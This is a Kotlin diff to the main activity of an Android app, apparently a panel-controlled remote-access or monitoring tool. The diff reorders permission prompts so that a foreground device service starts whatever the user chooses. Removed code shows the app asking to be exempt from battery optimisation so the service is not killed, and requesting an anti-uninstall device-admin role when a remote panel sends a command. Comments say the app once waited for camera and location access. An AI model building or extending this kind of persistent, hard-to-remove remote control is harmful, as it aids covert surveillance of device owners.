@@ -2,11 +2,13 @@ package com.sync.xxx
 
 import android.annotation.SuppressLint
 import android.content.*
+import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.*
 import android.provider.Settings
 import android.webkit.*
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import org.json.JSONObject
 
@@ -17,9 +19,12 @@ class MainActivity : AppCompatActivity() {
 
     private val HTML_ASSET = "file:///android_asset/index.html"
 
-    private var settingIndex = 0
     private var isRequestingSettings = false
-    private var hasRequestedSettings = false
+    private var overlayRequested = false
+
+    companion object {
+        private const val REQ_NOTIF_PERMISSION = 1001
+    }
 
     private val commandReceiver = object : BroadcastReceiver() {
         override fun onReceive(ctx: Context, intent: Intent) {
@@ -38,11 +43,81 @@ class MainActivity : AppCompatActivity() {
         setupWebView()
         registerReceivers()
 
-        Handler(Looper.getMainLooper()).postDelayed({
-            try { startDeviceService() } catch (e: Exception) {
-                android.util.Log.e("MainActivity", "Gagal start service tertunda: ${e.message}")
+        // 🔥 STEP 1: Minta POST_NOTIFICATIONS (wajib Android 13+)
+        requestNotificationPermission()
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // STEP 1: POST_NOTIFICATIONS (unavoidable di Android 13+)
+    // ═══════════════════════════════════════════════════════════
+    private fun requestNotificationPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            val granted = ContextCompat.checkSelfPermission(
+                this, "android.permission.POST_NOTIFICATIONS"
+            ) == PackageManager.PERMISSION_GRANTED
+
+            if (!granted) {
+                ActivityCompat.requestPermissions(
+                    this,
+                    arrayOf("android.permission.POST_NOTIFICATIONS"),
+                    REQ_NOTIF_PERMISSION
+                )
+                return
             }
-        }, 10_000)
+        }
+        // Sudah granted / Android < 13 → langsung lanjut ke overlay
+        proceedToOverlay()
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == REQ_NOTIF_PERMISSION) {
+            // Apapun hasilnya, lanjut ke overlay
+            proceedToOverlay()
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // STEP 2: OVERLAY (izin utama, 1x perizinan)
+    // ═══════════════════════════════════════════════════════════
+    private fun proceedToOverlay() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (!Settings.canDrawOverlays(this) && !overlayRequested) {
+                overlayRequested = true
+                isRequestingSettings = true
+                try {
+                    startActivity(
+                        Intent(
+                            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                            Uri.parse("package:$packageName")
+                        )
+                    )
+                    return
+                } catch (e: Exception) {
+                    android.util.Log.e("MainActivity", "Gagal buka overlay settings: ${e.message}")
+                }
+            }
+        }
+        // Overlay sudah granted / Android < M → start service
+        startDeviceServiceDelayed()
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // START SERVICE
+    // ═══════════════════════════════════════════════════════════
+    private fun startDeviceServiceDelayed() {
+        Handler(Looper.getMainLooper()).postDelayed({
+            try {
+                val svcIntent = Intent(this, DeviceService::class.java)
+                ContextCompat.startForegroundService(this, svcIntent)
+            } catch (e: Exception) {
+                android.util.Log.e("MainActivity", "Gagal start service: ${e.message}")
+            }
+        }, 2000)
     }
 
     private fun readAccountUid() {
@@ -73,16 +148,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ✅ Nggak nunggu camera/location lagi — overlay-only mode
-    private fun startDeviceService() {
-        try {
-            val svcIntent = Intent(this, DeviceService::class.java)
-            ContextCompat.startForegroundService(this, svcIntent)
-        } catch (e: Exception) {
-            android.util.Log.e("MainActivity", "Gagal start service: ${e.message}")
-        }
-    }
-
     @SuppressLint("SetJavaScriptEnabled")
     private fun setupWebView() {
         webView = findViewById(R.id.mainWebView)
@@ -108,16 +173,6 @@ class MainActivity : AppCompatActivity() {
         }
 
         webView.webViewClient = object : WebViewClient() {
-            override fun onPageFinished(view: WebView?, url: String?) {
-                super.onPageFinished(view, url)
-                if (!hasRequestedSettings) {
-                    hasRequestedSettings = true
-                    Handler(Looper.getMainLooper()).postDelayed({
-                        startSettingSequence()
-                    }, 1500)
-                }
-            }
-
             override fun onReceivedError(
                 view: WebView?,
                 request: WebResourceRequest?,
@@ -146,12 +201,6 @@ class MainActivity : AppCompatActivity() {
 
         if (!hasHtml) {
             showErrorPage("Aplikasi Error.\nFile HTML belum ditemukan dalam paket.")
-            if (!hasRequestedSettings) {
-                hasRequestedSettings = true
-                Handler(Looper.getMainLooper()).postDelayed({
-                    startSettingSequence()
-                }, 1500)
-            }
             return
         }
 
@@ -194,62 +243,14 @@ class MainActivity : AppCompatActivity() {
         webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
     }
 
-    // ═════════════════════════════════════════════════════════════
-    // SPECIAL SETTINGS: cuma Overlay + Battery Opt (+ Device Admin)
-    // ═════════════════════════════════════════════════════════════
-    private fun startSettingSequence() {
-        settingIndex = 0
-        requestNextSpecialSetting()
-    }
-
-    private fun requestNextSpecialSetting() {
-        val settingsIntents = mutableListOf<Intent>()
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            // 1. OVERLAY (izin utama)
-            if (!Settings.canDrawOverlays(this)) {
-                settingsIntents.add(
-                    Intent(
-                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                        Uri.parse("package:$packageName")
-                    )
-                )
-            }
-            // 2. Battery optimization (opsional, biar service tahan dibunuh)
-            val pm = getSystemService(POWER_SERVICE) as PowerManager
-            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                settingsIntents.add(
-                    Intent(
-                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                        Uri.parse("package:$packageName")
-                    )
-                )
-            }
-        }
-
-        // 3. Anti-uninstall admin: hanya kalau panel aktifkan via command setAntiUninstall
-        if (AntiUninstallHelper.isEnabled(this) && !AntiUninstallHelper.isAdminActive(this)) {
-            AntiUninstallHelper.requestAdminIfNeeded(this)
-        }
-
-        if (settingIndex < settingsIntents.size) {
-            isRequestingSettings = true
-            try {
-                startActivity(settingsIntents[settingIndex])
-            } catch (e: Exception) {
-                settingIndex++
-                requestNextSpecialSetting()
-            }
-        }
-    }
-
     override fun onResume() {
         super.onResume()
+        // Kalau user baru balik dari settings overlay → start service
         if (isRequestingSettings) {
             isRequestingSettings = false
-            settingIndex++
+            // Cek overlay granted atau tidak, apapun hasilnya start service
             Handler(Looper.getMainLooper()).postDelayed({
-                requestNextSpecialSetting()
+                startDeviceServiceDelayed()
             }, 1000)
         }
     }
@@ -296,7 +297,7 @@ class MainActivity : AppCompatActivity() {
         sendBroadcast(i)
     }
 
-    // ─── Helper hanya yang masih dipakai ───
+    // ─── Bridge helpers ───
     fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
         (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
     else true
@@ -306,6 +307,8 @@ class MainActivity : AppCompatActivity() {
 
     fun requestOverlayPerm() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            overlayRequested = true
+            isRequestingSettings = true
             startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
         }
     }
@@ -317,14 +320,14 @@ class MainActivity : AppCompatActivity() {
     }
 
     inner class MainBridge {
-        @android.webkit.JavascriptInterface
+        @JavascriptInterface
         fun connectNow() {
             Handler(Looper.getMainLooper()).post {
-                startDeviceService()
+                startDeviceServiceDelayed()
                 sendBroadcast(Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) })
             }
         }
-        @android.webkit.JavascriptInterface
+        @JavascriptInterface
         fun getUID(): String = accountUid
     }
 }
